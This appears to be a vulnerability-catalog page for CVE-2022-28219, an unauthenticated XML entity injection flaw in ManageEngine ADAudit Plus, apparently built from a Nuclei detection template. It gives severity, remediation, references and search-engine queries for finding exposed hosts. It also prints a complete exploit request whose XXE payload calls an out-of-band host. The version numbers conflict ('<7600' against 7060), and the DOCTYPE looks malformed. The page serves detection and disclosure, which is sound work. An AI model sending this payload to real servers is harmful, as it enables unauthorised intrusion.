---
layout: "post"
cve_id: "CVE-2022-28219"
title: "Zoho ManageEngine ADAudit Plus <7600 - XML Entity Injection/Remote Code Execution"
pcap: true
pcap_path: "/pcaps/2022/CVE-2022-28219.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-28219.yaml"
author: "dwisiswant0"
severity: "critical"
impact: "Successful exploitation of this vulnerability could allow an attacker to execute arbitrary code or perform remote code execution on the affected system.
"
remediation: "Update to ADAudit Plus build 7060 or later, and ensure ADAudit Plus
is configured with a dedicated service account with restricted privileges.
"
reference:
  - "https://www.manageengine.com/products/active-directory-audit/cve-2022-28219.html"
  - "https://www.horizon3.ai/red-team-blog-cve-2022-28219/"
  - "https://manageengine.com"
  - "https://nvd.nist.gov/vuln/detail/CVE-2022-28219"
  - "http://cewolf.sourceforge.net/new/index.html"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
  cvss-score: 9.8
  cve-id: "CVE-2022-28219"
  cwe-id: "CWE-611"
  epss-score: 0.93965
  epss-percentile: 0.99874
  cpe: "cpe:2.3:a:zohocorp:manageengine_adaudit_plus:*:*:*:*:*:*:*:*"
metadata:
  verified: True
  max-request: 1
  vendor: "zohocorp"
  product: "manageengine_adaudit_plus"
  shodan-query: ['http.title:"ADAudit Plus" || http.title:"ManageEngine - ADManager Plus"', 'http.title:"adaudit plus" || http.title:"manageengine - admanager plus"']
  fofa-query: "title=\"adaudit plus\" || http.title:\"manageengine - admanager plus\""
  google-query: "intitle:\"adaudit plus\" || http.title:\"manageengine - admanager plus\""
tags:
  - "cve"
  - "cve2022"
  - "xxe"
  - "rce"
  - "zoho"
  - "manageengine"
  - "unauth"
  - "zohocorp"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## ðŸ” Vulnerability Description
Zoho ManageEngine ADAudit Plus before version 7060 is vulnerable to an
unauthenticated XML entity injection attack that can lead to remote code execution.


## ðŸŒ HTTP Request
```nohighlight
POST /api/agent/tabs/agentData HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15
Connection: close
Content-Length: 284
Accept: */*
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

[
  {
    "DomainName": "www.victim.com",
    "EventCode": 4688,
    "EventType": 0,
    "TimeGenerated": 0,
    "Task Content": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><! foo [ <!ENTITY % xxe SYSTEM \"http://d4tabc9le0o4tm22a18ggoyujj5fhswgr.oast.live\"> %xxe; ]>"
  }
]
```


